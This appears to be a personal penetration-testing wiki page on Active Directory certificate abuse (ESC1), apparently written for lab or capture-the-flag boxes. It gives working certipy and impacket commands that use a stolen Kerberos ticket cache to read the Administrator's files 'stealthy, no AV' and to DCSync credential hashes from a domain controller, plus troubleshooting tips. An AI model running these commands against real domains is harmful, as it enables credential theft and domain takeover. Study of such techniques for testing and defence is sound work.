## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[active-directory-certificate-esc1]]
- [[active-directory-certificate-esc10]]
- [[active-directory-certificate-esc11]]
- [[active-directory-certificate-esc12]]
- [[active-directory-certificate-esc13]]
- [[active-directory-certificate-esc14]]
- [[active-directory-certificate-esc15]]
- [[active-directory-certificate-esc16]]
- [[active-directory-certificate-esc2]]
- [[active-directory-certificate-esc3]]
- [[active-directory-certificate-esc4]]
- [[active-directory-certificate-esc5]]
- [[active-directory-certificate-esc6]]
- [[active-directory-certificate-esc7]]
- [[active-directory-certificate-esc8]]
- [[active-directory-certificate-esc9]]
- [[active-directory-golden-certificate]]
- [[password-shadow-credentials]]

## ESC1 gotcha: target blocks NTLM -> use the cert's own Kerberos ticket

`certipy auth -pfx <victim>.pfx` (the PKINIT/UnPAC step after an ESC1/ESC9 request) yields **both** an
NT hash **and** a TGT credential cache (`<victim>.ccache`). If the impersonated account is NTLM-hardened
(member of **Protected Users**, or "this account may not use NTLM"), pass-the-hash returns
`STATUS_ACCOUNT_RESTRICTION` and the NT hash is a dead end. The ccache still works, so pivot to Kerberos:

```bash
# read files / flags without exec (stealthy, no AV) - inline the ccache, one command:
KRB5CCNAME=administrator.ccache impacket-smbclient -k -no-pass -dc-ip <DC_IP> <dc-fqdn>
#   use C$ ; get Users\Administrator\Desktop\root.txt
# or DCSync over Kerberos:
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -target-ip <DC_IP> -just-dc-user administrator <dc-fqdn>
```

The impersonated `Administrator` (RID 500) is a common Protected-Users target on lab DCs; do not grind the
PtH, use the ccache you already have.

### Tooling gotchas that mask a working ESC1
- `certipy req` throwing `The NETBIOS connection with the remote host timed out` -> add `-target-ip <DC_IP>`
  (RPC enrollment then hits the DC directly instead of via name resolution).
- impacket Kerberos ops hanging with `[Errno 110] Connection timed out (REALM:88)` while certipy worked
  seconds earlier = a **stale `/etc/hosts` realm line** from a prior box points the realm at a dead IP.
  Remove the old `<realm> -> <ip>` line and always force `-dc-ip`/`-target-ip` so KDC/target resolution
  never depends on DNS/hosts.

See [[pass-the-hash]], [[wiki/tools/certipy]].

<!-- promoted-slug: adcs-esc1-ntlm-restricted-kerberos -->
